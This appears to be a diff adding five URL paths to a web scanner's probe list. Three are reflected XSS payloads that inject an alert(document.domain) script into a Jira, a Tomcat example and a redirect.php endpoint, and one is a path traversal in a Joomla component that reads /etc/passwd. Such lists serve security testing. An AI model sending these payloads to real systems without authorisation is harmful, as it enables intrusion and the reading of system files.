@@ -1,0 +1,5 @@
+/jira/secure/BrowseProject.jspa?id=%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
+/examples/jsp/snp/snoop.jsp;<script>alert(document.domain)</script>test.jsp
+/index.php?option=com_rsfiles&task=files.display&path=../../../../../../../../../etc/passwd
+/login.action
+/redirect.php/%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E?subject=server&server=test
